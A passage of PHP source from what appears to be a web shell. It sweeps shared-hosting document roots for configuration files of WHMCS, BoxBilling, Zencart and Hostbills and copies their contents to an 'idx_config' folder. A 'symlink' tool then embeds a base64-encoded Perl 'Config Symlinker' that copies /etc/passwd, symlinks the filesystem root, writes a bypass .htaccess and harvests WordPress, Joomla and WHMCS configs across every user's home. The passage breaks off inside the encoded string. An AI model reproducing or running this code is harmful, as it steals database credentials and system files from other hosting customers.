						"$user_docroot/buy/submitticket.php" => "WHMCS",
						"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
						"$user_docroot/Manage/submitticket.php" => "WHMCS",
						"$user_docroot/manage/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
						"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
						"$user_docroot/Checkout/submitticket.php" => "WHMCS",
						"$user_docroot/checkout/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/BASKET/submitticket.php" => "WHMCS",
						"$user_docroot/Basket/submitticket.php" => "WHMCS",
						"$user_docroot/basket/submitticket.php" => "WHMCS",
						"$user_docroot/SECURE/submitticket.php" => "WHMCS",
						"$user_docroot/Secure/submitticket.php" => "WHMCS",
						"$user_docroot/secure/submitticket.php" => "WHMCS",
						"$user_docroot/SALES/submitticket.php" => "WHMCS",
						"$user_docroot/Sales/submitticket.php" => "WHMCS",
						"$user_docroot/sales/submitticket.php" => "WHMCS",
						"$user_docroot/BILL/submitticket.php" => "WHMCS",
						"$user_docroot/Bill/submitticket.php" => "WHMCS",
						"$user_docroot/bill/submitticket.php" => "WHMCS",
						"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
						"$user_docroot/Purchase/submitticket.php" => "WHMCS",
						"$user_docroot/purchase/submitticket.php" => "WHMCS",
						"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
						"$user_docroot/Account/submitticket.php" => "WHMCS",
						"$user_docroot/account/submitticket.php" => "WHMCS",
						"$user_docroot/USER/submitticket.php" => "WHMCS",
						"$user_docroot/User/submitticket.php" => "WHMCS",
						"$user_docroot/user/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
						"$user_docroot/Clients/submitticket.php" => "WHMCS",
						"$user_docroot/clients/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/MY/submitticket.php" => "WHMCS",
						"$user_docroot/My/submitticket.php" => "WHMCS",
						"$user_docroot/my/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/panel/submitticket.php" => "WHMCS",
						"$user_docroot/clientes/submitticket.php" => "WHMCS",
						"$user_docroot/cliente/submitticket.php" => "WHMCS",
						"$user_docroot/support/order/submitticket.php" => "WHMCS",
						"$user_docroot/bb-config.php" => "BoxBilling",
						"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
						"$user_docroot/box/bb-config.php" => "BoxBilling",
						"$user_docroot/host/bb-config.php" => "BoxBilling",
						"$user_docroot/Host/bb-config.php" => "BoxBilling",
						"$user_docroot/supportes/bb-config.php" => "BoxBilling",
						"$user_docroot/support/bb-config.php" => "BoxBilling",
						"$user_docroot/hosting/bb-config.php" => "BoxBilling",
						"$user_docroot/cart/bb-config.php" => "BoxBilling",
						"$user_docroot/order/bb-config.php" => "BoxBilling",
						"$user_docroot/client/bb-config.php" => "BoxBilling",
						"$user_docroot/clients/bb-config.php" => "BoxBilling",
						"$user_docroot/cliente/bb-config.php" => "BoxBilling",
						"$user_docroot/clientes/bb-config.php" => "BoxBilling",
						"$user_docroot/billing/bb-config.php" => "BoxBilling",
						"$user_docroot/billings/bb-config.php" => "BoxBilling",
						"$user_docroot/my/bb-config.php" => "BoxBilling",
						"$user_docroot/secure/bb-config.php" => "BoxBilling",
						"$user_docroot/support/order/bb-config.php" => "BoxBilling",
						"$user_docroot/includes/dist-configure.php" => "Zencart",
						"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/products/includes/dist-configure.php" => "Zencart",
						"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
						"$user_docroot/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
						"$user_docroot/host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
						"$user_docroot/order/includes/iso4217.php" => "Hostbills",
						"$user_docroot/client/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
						"$user_docroot/my/includes/iso4217.php" => "Hostbills",
						"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/order/includes/iso4217.php" => "Hostbills"

					);
					foreach($getconfig as $config => $userconfig) {
						$get = file_get_contents($config);
						if($get == '') {
						}
						else {
							$fopen = fopen("idx_config/$user-$userconfig.txt", "w");
							fputs($fopen, $get);
						}
					}
				}
			}
		}
		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'><iframe>";
		print "</div>";
	}
	elseif($toolsname === "symlink") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
		if(!is_dir(path()."/idx_sym/")) {
			$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltIjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdpZHhfc3ltL25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy8uYWNjZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dIT